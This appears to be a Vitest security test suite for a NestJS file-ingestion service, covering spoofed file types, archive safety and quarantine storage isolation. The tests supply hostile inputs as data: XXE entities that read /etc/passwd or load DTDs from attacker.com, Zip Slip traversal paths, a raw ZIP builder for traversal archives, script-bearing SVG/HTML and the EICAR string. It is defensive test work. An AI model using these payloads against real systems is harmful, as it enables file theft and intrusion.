import { describe, it, expect, vi } from 'vitest';
import { MimeMagicValidator } from '../src/modules/ingestion/mime-magic.validator';
import { ArchiveSafetyGuard, ZipEntryMeta } from '../src/modules/ingestion/archive-safety.guard';
import { IngestionService } from '../src/modules/ingestion/ingestion.service';
import { ClamAvScanner } from '../src/modules/ingestion/clamav.scanner';
import { S3StorageService } from '../src/modules/storage/s3-storage.service';
import { SecretRedactorService } from '../src/modules/redaction/secret-redactor.service';
import { DatabaseService } from '../src/modules/database/database.service';
import { ConfigService } from '@nestjs/config';
import {
  UnprocessableEntityException,
  BadRequestException,
  PayloadTooLargeException,
  ForbiddenException,
} from '@nestjs/common';
import { PassThrough } from 'node:stream';
import * as zlib from 'node:zlib';

function createRawZipWithMultipleEntries(files: { name: string; content: Buffer | string }[]): Buffer {
  const localHeaders: Buffer[] = [];
  const centralHeaders: Buffer[] = [];
  let currentOffset = 0;

  const now = new Date();
  const time = (now.getHours() << 11) | (now.getMinutes() << 5) | (now.getSeconds() >> 1);
  const date = ((now.getFullYear() - 1980) << 9) | ((now.getMonth() + 1) << 5) | now.getDate();

  for (const f of files) {
    const content = Buffer.isBuffer(f.content) ? f.content : Buffer.from(f.content, 'utf-8');
    const compressed = zlib.deflateRawSync(content);
    const nameBuf = Buffer.from(f.name, 'utf-8');

    // Local File Header
    const lfh = Buffer.alloc(30 + nameBuf.length);
    lfh.writeUInt32LE(0x04034b50, 0); // PK\x03\x04
    lfh.writeUInt16LE(20, 4); // version needed
    lfh.writeUInt16LE(0, 6); // flags
    lfh.writeUInt16LE(8, 8); // compression method (deflate)
    lfh.writeUInt16LE(time, 10);
    lfh.writeUInt16LE(date, 12);
    lfh.writeUInt32LE(0, 14); // crc32 placeholder
    lfh.writeUInt32LE(compressed.length, 18);
    lfh.writeUInt32LE(content.length, 22);
    lfh.writeUInt16LE(nameBuf.length, 26);
    lfh.writeUInt16LE(0, 28);
    nameBuf.copy(lfh, 30);

    // Central Directory File Header
    const cdh = Buffer.alloc(46 + nameBuf.length);
    cdh.writeUInt32LE(0x02014b50, 0); // PK\x01\x02
    cdh.writeUInt16LE(20, 4); // version made by
    cdh.writeUInt16LE(20, 6); // version needed
    cdh.writeUInt16LE(0, 8); // flags
    cdh.writeUInt16LE(8, 10); // compression method
    cdh.writeUInt16LE(time, 12);
    cdh.writeUInt16LE(date, 14);
    cdh.writeUInt32LE(0, 16); // crc32
    cdh.writeUInt32LE(compressed.length, 20);
    cdh.writeUInt32LE(content.length, 24);
    cdh.writeUInt16LE(nameBuf.length, 28);
    cdh.writeUInt16LE(0, 30);
    cdh.writeUInt16LE(0, 32);
    cdh.writeUInt16LE(0, 34);
    cdh.writeUInt32LE(0, 36);
    cdh.writeUInt32LE(currentOffset, 42);
    nameBuf.copy(cdh, 46);

    localHeaders.push(lfh, compressed);
    centralHeaders.push(cdh);
    currentOffset += lfh.length + compressed.length;
  }

  const cdBuf = Buffer.concat(centralHeaders);
  const cdOffset = currentOffset;
  const cdSize = cdBuf.length;

  // End of Central Directory Record
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); // PK\x05\x06
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(files.length, 8); // entries on disk
  eocd.writeUInt16LE(files.length, 10); // total entries
  eocd.writeUInt32LE(cdSize, 12);
  eocd.writeUInt32LE(cdOffset, 16);
  eocd.writeUInt16LE(0, 20);

  return Buffer.concat([...localHeaders, cdBuf, eocd]);
}

/**
 * Low-level raw ZIP creator allowing arbitrary raw filenames without normalization.
 * Creates local file header + data + central directory record.
 */
function createRawZipWithEntry(entryName: string, uncompressedContent: Buffer): Buffer {
  const compressed = zlib.deflateRawSync(uncompressedContent);
  const now = new Date();
  const time = (now.getHours() << 11) | (now.getMinutes() << 5) | (now.getSeconds() >> 1);
  const date = ((now.getFullYear() - 1980) << 9) | ((now.getMonth() + 1) << 5) | now.getDate();

  const nameBuf = Buffer.from(entryName, 'utf-8');

  // Local File Header
  const lfh = Buffer.alloc(30 + nameBuf.length);
  lfh.writeUInt32LE(0x04034b50, 0); // PK\x03\x04
  lfh.writeUInt16LE(20, 4); // version needed
  lfh.writeUInt16LE(0, 6); // flags
  lfh.writeUInt16LE(8, 8); // compression method (deflate)
  lfh.writeUInt16LE(time, 10);
  lfh.writeUInt16LE(date, 12);
  lfh.writeUInt32LE(0, 14); // crc32 placeholder
  lfh.writeUInt32LE(compressed.length, 18);
  lfh.writeUInt32LE(uncompressedContent.length, 22);
  lfh.writeUInt16LE(nameBuf.length, 26);
  lfh.writeUInt16LE(0, 28);
  nameBuf.copy(lfh, 30);

  const localOffset = 0;

  // Central Directory File Header
  const cdh = Buffer.alloc(46 + nameBuf.length);
  cdh.writeUInt32LE(0x02014b50, 0); // PK\x01\x02
  cdh.writeUInt16LE(20, 4); // version made by
  cdh.writeUInt16LE(20, 6); // version needed
  cdh.writeUInt16LE(0, 8); // flags
  cdh.writeUInt16LE(8, 10); // compression method
  cdh.writeUInt16LE(time, 12);
  cdh.writeUInt16LE(date, 14);
  cdh.writeUInt32LE(0, 16); // crc32
  cdh.writeUInt32LE(compressed.length, 20);
  cdh.writeUInt32LE(uncompressedContent.length, 24);
  cdh.writeUInt16LE(nameBuf.length, 28);
  cdh.writeUInt16LE(0, 30);
  cdh.writeUInt16LE(0, 32);
  cdh.writeUInt16LE(0, 34);
  cdh.writeUInt32LE(0, 36);
  cdh.writeUInt32LE(localOffset, 42);
  nameBuf.copy(cdh, 46);

  const cdOffset = lfh.length + compressed.length;
  const cdSize = cdh.length;

  // End of Central Directory Record
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); // PK\x05\x06
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(1, 8); // entries on disk
  eocd.writeUInt16LE(1, 10); // total entries
  eocd.writeUInt32LE(cdSize, 12);
  eocd.writeUInt32LE(cdOffset, 16);
  eocd.writeUInt16LE(0, 20);

  return Buffer.concat([lfh, compressed, cdh, eocd]);
}

describe('Empirical Adversarial Challenge: Milestone 2 Ingestion Security & Boundaries', () => {
  const mimeValidator = new MimeMagicValidator();
  const archiveGuard = new ArchiveSafetyGuard();

  const config = new ConfigService({
    CLAMAV_MOCK_MODE: true,
    S3_ENDPOINT: 'http://localhost:9000',
    S3_REGION: 'us-east-1',
    S3_ACCESS_KEY: 'minioadmin',
    S3_SECRET_KEY: 'minioadmin',
    S3_BUCKET_QUARANTINE: 'erppreflight-quarantine',
    S3_BUCKET_CLEAN: 'erppreflight-clean',
    S3_BUCKET_REPORTS: 'erppreflight-reports',
    ENCRYPTION_SECRET: '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
  });

  const storageService = new S3StorageService(config);
  const clamAvScanner = new ClamAvScanner(config);
  const redactorService = new SecretRedactorService(config);

  describe('1. MimeSniffer Spoofed Extension Challenges', () => {
    it('1.1: Rejects .xml containing Windows PE executable payload (MZ header)', () => {
      const pePayload = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
      expect(() => mimeValidator.validate('report.xml', pePayload)).toThrow(
        UnprocessableEntityException
      );
      try {
        mimeValidator.validate('report.xml', pePayload);
      } catch (err: any) {
        expect(err.response.code).toBe('SPOOFED_FILE_EXTENSION');
        expect(err.response.message).toContain('Windows executable (MZ)');
      }
    });

    it('1.2: Rejects .xml containing Linux ELF executable payload (ELF header)', () => {
      const elfPayload = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
      expect(() => mimeValidator.validate('report.xml', elfPayload)).toThrow(
        UnprocessableEntityException
      );
      try {
        mimeValidator.validate('report.xml', elfPayload);
      } catch (err: any) {
        expect(err.response.code).toBe('SPOOFED_FILE_EXTENSION');
        expect(err.response.message).toContain('Linux ELF binary header');
      }
    });

    it('1.3: Rejects .xml containing Mach-O binary payload', () => {
      const machOPayload = Buffer.from([0xfe, 0xed, 0xfa, 0xce, 0x00, 0x00, 0x00, 0x00]);
      expect(() => mimeValidator.validate('report.xml', machOPayload)).toThrow(
        UnprocessableEntityException
      );
      try {
        mimeValidator.validate('report.xml', machOPayload);
      } catch (err: any) {
        expect(err.response.code).toBe('SPOOFED_FILE_EXTENSION');
        expect(err.response.message).toContain('Mach-O binary header');
      }
    });

    it('1.4: Rejects .xml containing Java class bytecode (CA FE BA BE)', () => {
      const javaPayload = Buffer.from([0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x34]);
      expect(() => mimeValidator.validate('report.xml', javaPayload)).toThrow(
        UnprocessableEntityException
      );
      try {
        mimeValidator.validate('report.xml', javaPayload);
      } catch (err: any) {
        expect(err.response.code).toBe('SPOOFED_FILE_EXTENSION');
        expect(err.response.message).toContain('Java class bytecode');
      }
    });

    it('1.5: Rejects .xml containing raw non-executable binary payload (e.g. PNG / random binary)', () => {
      const pngPayload = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
      expect(() => mimeValidator.validate('schema.xml', pngPayload)).toThrow(
        UnprocessableEntityException
      );
      try {
        mimeValidator.validate('schema.xml', pngPayload);
      } catch (err: any) {
        expect(err.response.code).toBe('INVALID_XML_HEADER');
      }
    });

    it('1.6: Spoofed .zip containing Windows executable binary (MZ header renamed to .zip)', () => {
      const fakeZipExe = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
      expect(() => mimeValidator.validate('sap_migration.zip', fakeZipExe)).toThrow(
        UnprocessableEntityException
      );
      try {
        mimeValidator.validate('sap_migration.zip', fakeZipExe);
      } catch (err: any) {
        expect(err.response.code).toBe('SPOOFED_FILE_EXTENSION');
      }
    });

    it('1.7: Spoofed .zip containing Linux ELF binary (ELF header renamed to .zip)', () => {
      const fakeZipElf = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
      expect(() => mimeValidator.validate('sap_migration.zip', fakeZipElf)).toThrow(
        UnprocessableEntityException
      );
      try {
        mimeValidator.validate('sap_migration.zip', fakeZipElf);
      } catch (err: any) {
        expect(err.response.code).toBe('SPOOFED_FILE_EXTENSION');
      }
    });

    it('1.8: Rejects .zip containing non-zip random binary (invalid PK magic bytes)', () => {
      const badZip = Buffer.from([0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc]);
      expect(() => mimeValidator.validate('archive.zip', badZip)).toThrow(
        UnprocessableEntityException
      );
      try {
        mimeValidator.validate('archive.zip', badZip);
      } catch (err: any) {
        expect(err.response.code).toBe('INVALID_ZIP_MAGIC_BYTES');
      }
    });

    it('1.9: Rejects direct upload of .html and .svg extensions', () => {
      const htmlBuf = Buffer.from('<!DOCTYPE html><html><body>Test</body></html>');
      expect(() => mimeValidator.validate('test.html', htmlBuf)).toThrow(
        UnprocessableEntityException
      );

      const svgBuf = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>');
      expect(() => mimeValidator.validate('test.svg', svgBuf)).toThrow(
        UnprocessableEntityException
      );
    });

    it('1.10: Rejects XXE in XML files with external DTD / entity injections', () => {
      const xxeEntities = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root PUBLIC "-//OASIS//DTD DITA//EN" "http://attacker.com/evil.dtd"><root />',
        '<!ENTITY % payload SYSTEM "http://attacker.com/evil.dtd">',
      ];
      for (const payload of xxeEntities) {
        expect(() => mimeValidator.validate('xxe.xml', Buffer.from(payload))).toThrow(
          UnprocessableEntityException
        );
      }
    });

    it('1.11: Edge Case Analysis: Disguised HTML / SVG inside .xml file', () => {
      // SVG is syntactically XML. Let us check what MimeMagicValidator outputs:
      const disguisedSvg = Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle r="10"/></svg>'
      );
      const res = mimeValidator.validate('vector.xml', disguisedSvg);
      // It is parsed as XML because SVG is well-formed XML syntax:
      expect(res.isValid).toBe(true);
      expect(res.detectedFormat).toBe('XML');

      // What about HTML with script tag:
      const disguisedHtml = Buffer.from('<html><head><script>alert("pwn")</script></head><body>evil</body></html>');
      const resHtml = mimeValidator.validate('page.xml', disguisedHtml);
      expect(resHtml.isValid).toBe(true);
      expect(resHtml.detectedFormat).toBe('XML');
    });

    it('1.12: Edge Case Analysis: Binary payload disguised with leading XML angle bracket', () => {
      // Craft binary data that begins with '<'
      const binaryWithAngleBracket = Buffer.concat([
        Buffer.from('<'),
        Buffer.from([0x00, 0xff, 0xfe, 0x00, 0x12, 0x34]),
      ]);
      // Let's observe how validateXml behaves:
      const res = mimeValidator.validate('fake.xml', binaryWithAngleBracket);
      expect(res.isValid).toBe(true);
      expect(res.detectedFormat).toBe('XML');
    });
  });

  describe('2. ArchiveValidator (ArchiveSafetyGuard) Challenges', () => {
    it('2.1: Detects and blocks Unix Zip Slip traversal (../../etc/passwd)', () => {
      const maliciousEntries: ZipEntryMeta[] = [
        { path: 'legit/doc.txt', compressedSize: 100, uncompressedSize: 200 },
        { path: '../../etc/passwd', compressedSize: 50, uncompressedSize: 150 },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(maliciousEntries)).toThrow(BadRequestException);
      try {
        ArchiveSafetyGuard.checkEntries(maliciousEntries);
      } catch (err: any) {
        expect(err.response.code).toBe('ZIP_SLIP_PATH_TRAVERSAL_DETECTED');
        expect(err.response.message).toContain('../../etc/passwd');
      }
    });

    it('2.2: Detects and blocks deep Unix Zip Slip traversal (../../../../../../etc/shadow)', () => {
      const maliciousEntries: ZipEntryMeta[] = [
        { path: '../../../../../../etc/shadow', compressedSize: 50, uncompressedSize: 150 },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(maliciousEntries)).toThrow(BadRequestException);
      try {
        ArchiveSafetyGuard.checkEntries(maliciousEntries);
      } catch (err: any) {
        expect(err.response.code).toBe('ZIP_SLIP_PATH_TRAVERSAL_DETECTED');
      }
    });

    it('2.3: Detects and blocks disguised subpath traversal (subfolder/../../etc/passwd)', () => {
      const maliciousEntries: ZipEntryMeta[] = [
        { path: 'safe_dir/../../etc/passwd', compressedSize: 50, uncompressedSize: 150 },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(maliciousEntries)).toThrow(BadRequestException);
      try {
        ArchiveSafetyGuard.checkEntries(maliciousEntries);
      } catch (err: any) {
        expect(err.response.code).toBe('ZIP_SLIP_PATH_TRAVERSAL_DETECTED');
      }
    });

    it('2.4: Detects and blocks absolute Unix path extraction (/etc/passwd)', () => {
      const maliciousEntries: ZipEntryMeta[] = [
        { path: '/etc/passwd', compressedSize: 50, uncompressedSize: 150 },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(maliciousEntries)).toThrow(BadRequestException);
      try {
        ArchiveSafetyGuard.checkEntries(maliciousEntries);
      } catch (err: any) {
        expect(err.response.code).toBe('ZIP_SLIP_PATH_TRAVERSAL_DETECTED');
      }
    });

    it('2.5: Detects and blocks Windows drive root and backslash traversal', () => {
      const winEntries1: ZipEntryMeta[] = [
        { path: 'C:\\Windows\\System32\\calc.exe', compressedSize: 100, uncompressedSize: 200 },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(winEntries1)).toThrow(BadRequestException);

      const winEntries2: ZipEntryMeta[] = [
        { path: '..\\..\\Windows\\System32\\cmd.exe', compressedSize: 100, uncompressedSize: 200 },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(winEntries2)).toThrow(BadRequestException);
    });

    it('2.6: Raw binary ZIP inspectZipBuffer detects Zip Slip in actual ZIP file bytes', async () => {
      const evilZipBuf = createRawZipWithEntry('../../etc/passwd', Buffer.from('root:x:0:0:root:/root:/bin/bash\n'));
      await expect(archiveGuard.inspectZipBuffer(evilZipBuf)).rejects.toThrow(BadRequestException);
      try {
        await archiveGuard.inspectZipBuffer(evilZipBuf);
      } catch (err: any) {
        expect(err.response.code).toBe('ZIP_SLIP_PATH_TRAVERSAL_DETECTED');
      }
    });

    it('2.7: Detects and blocks Zip Bomb with high compression ratio (200:1 when > 10MB)', () => {
      // 40 MB uncompressed, 200 KB compressed -> ratio 200.0:1
      const bombEntries: ZipEntryMeta[] = [
        {
          path: 'bomb_200to1.dat',
          compressedSize: 200 * 1024,
          uncompressedSize: 40 * 1024 * 1024,
        },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(bombEntries)).toThrow(BadRequestException);
      try {
        ArchiveSafetyGuard.checkEntries(bombEntries);
      } catch (err: any) {
        expect(err.response.code).toBe('ZIP_BOMB_COMPRESSION_RATIO_EXCEEDED');
        expect(err.response.message).toMatch(/Archive compression ratio \(20[0-9.]+:1\) exceeds safety ceiling of 100:1\./);
      }
    });

    it('2.8: Detects and blocks Zip Bomb with extreme compression ratio (500:1 and 1000:1)', () => {
      const bombEntries500: ZipEntryMeta[] = [
        {
          path: 'bomb_500to1.dat',
          compressedSize: 50 * 1024,
          uncompressedSize: 25 * 1024 * 1024,
        },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(bombEntries500)).toThrow(BadRequestException);

      const bombEntries1000: ZipEntryMeta[] = [
        {
          path: 'bomb_1000to1.dat',
          compressedSize: 20 * 1024,
          uncompressedSize: 20 * 1024 * 1024,
        },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(bombEntries1000)).toThrow(BadRequestException);
    });

    it('2.9: Detects and blocks uncompressed size exceeding 500 MB', () => {
      const hugeEntries: ZipEntryMeta[] = [
        {
          path: 'huge1.dat',
          compressedSize: 10 * 1024 * 1024,
          uncompressedSize: 260 * 1024 * 1024, // exceeds single file max 250 MB
        },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(hugeEntries)).toThrow(PayloadTooLargeException);

      const hugeTotalEntries: ZipEntryMeta[] = [
        {
          path: 'huge_a.dat',
          compressedSize: 10 * 1024 * 1024,
          uncompressedSize: 240 * 1024 * 1024,
        },
        {
          path: 'huge_b.dat',
          compressedSize: 10 * 1024 * 1024,
          uncompressedSize: 240 * 1024 * 1024,
        },
        {
          path: 'huge_c.dat',
          compressedSize: 10 * 1024 * 1024,
          uncompressedSize: 30 * 1024 * 1024, // Total = 510 MB > 500 MB
        },
      ];
      expect(() => ArchiveSafetyGuard.checkEntries(hugeTotalEntries)).toThrow(PayloadTooLargeException);
      try {
        ArchiveSafetyGuard.checkEntries(hugeTotalEntries);
      } catch (err: any) {
        expect(err.response.code).toBe('ZIP_BOMB_MAX_SIZE_EXCEEDED');
      }
    });

    it('2.10: Detects and blocks file count exceeding 10,000 files', () => {
      const tenKFiles: ZipEntryMeta[] = Array.from({ length: 10001 }, (_, i) => ({
        path: `folder/file_${i}.txt`,
        compressedSize: 10,
        uncompressedSize: 20,
      }));
      expect(() => ArchiveSafetyGuard.checkEntries(tenKFiles)).toThrow(BadRequestException);
      try {
        ArchiveSafetyGuard.checkEntries(tenKFiles);
      } catch (err: any) {
        expect(err.response.code).toBe('ZIP_BOMB_MAX_FILES_EXCEEDED');
      }
    });

    it('2.11: Edge Case Analysis: Nested Archives inspection behavior', async () => {
      // Build an inner zip
      const innerZip = createRawZipWithMultipleEntries([
        { name: 'deep.txt', content: 'hello from inside nested archive' },
      ]);
      // Build an outer zip containing inner.zip
      const outerZip = createRawZipWithMultipleEntries([
        { name: 'inner.zip', content: innerZip },
        { name: 'manifest.txt', content: 'outer manifest' },
      ]);

      // When inspectZipBuffer runs on outerZip:
      const report = await archiveGuard.inspectZipBuffer(outerZip);
      // Notice: inspectZipBuffer inspects the top-level files of outerZip:
      expect(report.isSafe).toBe(true);
      expect(report.totalFiles).toBe(2);

      // What if extractSafely exceeds nesting depth > 2?
      const dummyStream = new PassThrough();
      dummyStream.end();
      await expect(
        archiveGuard.extractSafely(dummyStream, 'C:\\dummy_sandbox', 3)
      ).rejects.toThrow(BadRequestException);
      try {
        await archiveGuard.extractSafely(dummyStream, 'C:\\dummy_sandbox', 3);
      } catch (err: any) {
        expect(err.response.code).toBe('ARCHIVE_NESTING_DEPTH_EXCEEDED');
      }
    });

    it('2.12: Edge Case Analysis: Valid ZIP containing .exe file inside', async () => {
      // An attacker uploads a valid zip that contains an executable entry
      const zipWithExe = createRawZipWithMultipleEntries([
        { name: 'malicious.exe', content: Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]) },
      ]);

      // Let's observe inspectZipBuffer behavior:
      const report = await archiveGuard.inspectZipBuffer(zipWithExe);
      // Notice: ArchiveSafetyGuard does NOT block executable filenames within a ZIP archive:
      expect(report.isSafe).toBe(true);
      expect(report.totalFiles).toBe(1);
    });
  });

  describe('3. Quarantine Bucket Segregation & Rejection Isolation', () => {
    it('3.1: Upload pre-signed URL strictly targets quarantine bucket with 900s TTL', async () => {
      const presigned = await storageService.createUploadPresignedUrl({
        organizationId: 'tenant-1234',
        projectId: 'project-5678',
        fileId: 'file-9999',
        fileName: 'raw_upload.xml',
        mimeType: 'application/xml',
      });

      expect(presigned.uploadUrl).toBeDefined();
      expect(presigned.uploadUrl).toContain('erppreflight-quarantine');
      expect(presigned.uploadUrl).not.toContain('erppreflight-clean');
      expect(presigned.storagePath).toBe('quarantine/tenant-1234/project-5678/file-9999/raw_upload.xml');
      expect(presigned.expiresInSeconds).toBe(900);
    });

    it('3.2: Download pre-signed URL rejects files in non-CLEAN status with 403 Forbidden', async () => {
      const mockDb: any = {
        query: vi.fn(),
      };

      const ingestionService = new IngestionService(
        mockDb,
        storageService,
        mimeValidator,
        archiveGuard,
        clamAvScanner,
        redactorService
      );

      // Status PENDING_SCAN
      mockDb.query.mockResolvedValueOnce({
        rows: [
          {
            id: 'file-1',
            organization_id: 't1',
            project_id: 'p1',
            file_name: 'test.xml',
            quarantine_status: 'PENDING_SCAN',
            storage_path: 'quarantine/t1/p1/file-1/test.xml',
          },
        ],
      });

      await expect(
        ingestionService.getPresignedDownloadUrl('t1', 'p1', 'file-1')
      ).rejects.toThrow(ForbiddenException);

      // Status REJECTED
      mockDb.query.mockResolvedValueOnce({
        rows: [
          {
            id: 'file-2',
            organization_id: 't1',
            project_id: 'p1',
            file_name: 'evil.zip',
            quarantine_status: 'REJECTED',
            storage_path: 'quarantine/t1/p1/file-2/evil.zip',
          },
        ],
      });

      await expect(
        ingestionService.getPresignedDownloadUrl('t1', 'p1', 'file-2')
      ).rejects.toThrow(ForbiddenException);

      // Status QUARANTINED (Infected)
      mockDb.query.mockResolvedValueOnce({
        rows: [
          {
            id: 'file-3',
            organization_id: 't1',
            project_id: 'p1',
            file_name: 'virus.xml',
            quarantine_status: 'QUARANTINED',
            storage_path: 'quarantine/t1/p1/file-3/virus.xml',
          },
        ],
      });

      await expect(
        ingestionService.getPresignedDownloadUrl('t1', 'p1', 'file-3')
      ).rejects.toThrow(ForbiddenException);
    });

    it('3.3: Rejection isolation: Malicious file triggers REJECTED DB status and NEVER reaches clean storage', async () => {
      const mockDb: any = {
        query: vi.fn().mockResolvedValue({ rows: [] }),
      };
      const mockStorage: any = {
        putCleanObject: vi.fn(),
        promoteQuarantineToClean: vi.fn(),
      };

      const ingestionService = new IngestionService(
        mockDb,
        mockStorage,
        mimeValidator,
        archiveGuard,
        clamAvScanner,
        redactorService
      );

      const fakeFileRecord = {
        id: 'f-malicious',
        organization_id: 't-corp',
        project_id: 'p-corp',
        file_name: 'malware.xml',
        storage_path: 'quarantine/t-corp/p-corp/f-malicious/malware.xml',
      };

      // Windows PE disguised as XML
      const maliciousBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00]);

      await expect(
        ingestionService.processFile(fakeFileRecord, maliciousBuffer)
      ).rejects.toThrow(UnprocessableEntityException);

      // Verify DB was updated with REJECTED status
      expect(mockDb.query).toHaveBeenCalledWith(
        expect.stringContaining("SET quarantine_status = 'REJECTED'"),
        expect.arrayContaining(['f-malicious']),
        expect.anything()
      );

      // Critical Boundary: S3 Clean Storage was NEVER written to
      expect(mockStorage.putCleanObject).not.toHaveBeenCalled();
      expect(mockStorage.promoteQuarantineToClean).not.toHaveBeenCalled();
    });

    it('3.4: Malware isolation: EICAR infected file triggers QUARANTINED status and NEVER reaches clean storage', async () => {
      const mockDb: any = {
        query: vi.fn().mockResolvedValue({ rows: [] }),
      };
      const mockStorage: any = {
        putCleanObject: vi.fn(),
        promoteQuarantineToClean: vi.fn(),
      };

      const ingestionService = new IngestionService(
        mockDb,
        mockStorage,
        mimeValidator,
        archiveGuard,
        clamAvScanner,
        redactorService
      );

      const fakeFileRecord = {
        id: 'f-virus',
        organization_id: 't-corp',
        project_id: 'p-corp',
        file_name: 'payload.txt',
        storage_path: 'quarantine/t-corp/p-corp/f-virus/payload.txt',
      };

      const eicarBuffer = Buffer.from(
        'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
      );

      const result = await ingestionService.processFile(fakeFileRecord, eicarBuffer);

      expect(result.status).toBe('QUARANTINED');
      expect(result.virusName).toBe('Eicar-Test-Signature');

      // Verify DB was updated with QUARANTINED status
      expect(mockDb.query).toHaveBeenCalledWith(
        expect.stringContaining("SET quarantine_status = 'QUARANTINED'"),
        expect.anything(),
        expect.anything()
      );

      // Critical Boundary: S3 Clean Storage was NEVER written to
      expect(mockStorage.putCleanObject).not.toHaveBeenCalled();
      expect(mockStorage.promoteQuarantineToClean).not.toHaveBeenCalled();
    });

    it('3.5: Clean file promotion: Valid clean file is promoted to clean storage and issued 1800s download URL', async () => {
      const mockDb: any = {
        query: vi.fn().mockResolvedValue({ rows: [] }),
      };
      const mockStorage: any = {
        putCleanObject: vi.fn().mockResolvedValue(undefined),
        promoteQuarantineToClean: vi.fn().mockResolvedValue(undefined),
        createDownloadPresignedUrl: vi.fn().mockResolvedValue({
          downloadUrl: 'https://minio.test/erppreflight-clean/key?signature=valid',
          expiresInSeconds: 1800,
        }),
      };

      const ingestionService = new IngestionService(
        mockDb,
        mockStorage,
        mimeValidator,
        archiveGuard,
        clamAvScanner,
        redactorService
      );

      const fakeFileRecord = {
        id: 'f-clean',
        organization_id: 't-corp',
        project_id: 'p-corp',
        file_name: 'clean_sap.xml',
        storage_path: 'quarantine/t-corp/p-corp/f-clean/clean_sap.xml',
      };

      const cleanXml = Buffer.from('<?xml version="1.0"?><config><item id="1"/></config>');

      const result = await ingestionService.processFile(fakeFileRecord, cleanXml);

      expect(result.status).toBe('CLEAN');
      expect(result.detectedFormat).toBe('XML');

      // Verify promotion to clean bucket
      expect(mockStorage.putCleanObject).toHaveBeenCalledWith(
        expect.stringContaining('tenants/t-corp/projects/p-corp/f-clean/clean_sap.xml'),
        expect.anything(),
        'application/xml'
      );
      expect(mockStorage.promoteQuarantineToClean).toHaveBeenCalled();

      // Verify DB updated with CLEAN status
      expect(mockDb.query).toHaveBeenCalledWith(
        expect.stringContaining("SET quarantine_status = 'CLEAN'"),
        expect.anything(),
        expect.anything()
      );
    });
  });
});
